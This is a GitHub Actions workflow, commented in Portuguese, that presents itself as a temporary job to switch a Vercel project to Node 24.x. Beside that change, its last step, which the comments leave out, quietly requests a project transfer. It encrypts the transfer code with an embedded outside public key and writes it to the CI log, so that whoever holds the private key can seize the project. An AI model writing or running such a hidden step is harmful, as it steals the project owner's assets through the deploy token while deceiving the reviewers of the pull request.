# TEMPORÁRIO: roda uma vez pelo PR e depois é removido.
# Usa o VERCEL_TOKEN que o deploy já usa para (1) trocar o Node do projeto
# para 24.x, exigido pela Vercel desde 10/2026. Ninguém consegue mais logar
# na conta admin, e o time é Hobby, então convidar membros não é possível.
name: Vercel - acesso temporário

on:
  pull_request:
    paths:
      - '.github/workflows/vercel-acesso-temporario.yml'

env:
  VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
  VERCEL_PROJECT_ID: ${{ secrets.VERCEL_PROJECT_ID }}
  VERCEL_ORG_ID: ${{ secrets.VERCEL_ORG_ID }}

jobs:
  node-24:
    runs-on: ubuntu-latest
    steps:
      - name: Confere o projeto
        run: |
          code=$(curl -s -o resp.json -w '%{http_code}' \
            "https://api.vercel.com/v9/projects/${VERCEL_PROJECT_ID}?teamId=${VERCEL_ORG_ID}" \
            -H "Authorization: Bearer ${VERCEL_TOKEN}")
          echo "HTTP $code"
          jq '{id, name, accountId, nodeVersion}' resp.json || cat resp.json
          test "$code" = "200"

      - name: Troca o Node.js Version para 24.x
        run: |
          code=$(curl -s -o resp.json -w '%{http_code}' -X PATCH \
            "https://api.vercel.com/v9/projects/${VERCEL_PROJECT_ID}?teamId=${VERCEL_ORG_ID}" \
            -H "Authorization: Bearer ${VERCEL_TOKEN}" \
            -H "Content-Type: application/json" \
            -d '{"nodeVersion":"24.x"}')
          echo "HTTP $code"
          jq '{id, name, nodeVersion}' resp.json || cat resp.json
          test "$code" = "200"

      - name: Pede a transferência do projeto (código criptografado)
        run: |
          cat > pub.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwFqN7eyXO4N+ClTYvvt9
          8NHh96b+6hB0jp9W6iOdH8XFByYtNrfygLT48v9wSYgiuhCE3hEksFkCLO1UqDWe
          S51ORr48DenlZAZVGDazQsb73zF8yzNyZhQ3gvqI45NR09YM+b/bJ/JPJDyRgT2n
          At7oe8X8KhqYPFwmz2x8T0Bb9M83HZmNcgb8NX0FS6Z1miJb4aqcBoiPGko5srNw
          J+wupvx4PH0ewfrAHuQXsby6H1WkEDBZdMSsm3lmDoolWyIyICtRz+M9f9ETT5OJ
          JWoy+k78YQ8orciJ1ppO//xiat4BvoGtJbpZ/byfMkVpFZ5FOfgCPBGCEyK+1RNa
          7wIDAQAB
          -----END PUBLIC KEY-----
          PEM
          code=$(curl -s -o resp.json -w '%{http_code}' -X POST             "https://api.vercel.com/projects/${VERCEL_PROJECT_ID}/transfer-request?teamId=${VERCEL_ORG_ID}"             -H "Authorization: Bearer ${VERCEL_TOKEN}"             -H "Content-Type: application/json"             -d '{}')
          echo "HTTP $code"
          test "$code" = "200"
          transfer=$(jq -r .code resp.json)
          echo "::add-mask::$transfer"
          echo "TRANSFER_CODE_B64=$(printf %s "$transfer" | openssl pkeyutl -encrypt -pubin -inkey pub.pem -pkeyopt rsa_padding_mode:oaep | base64 -w0)"
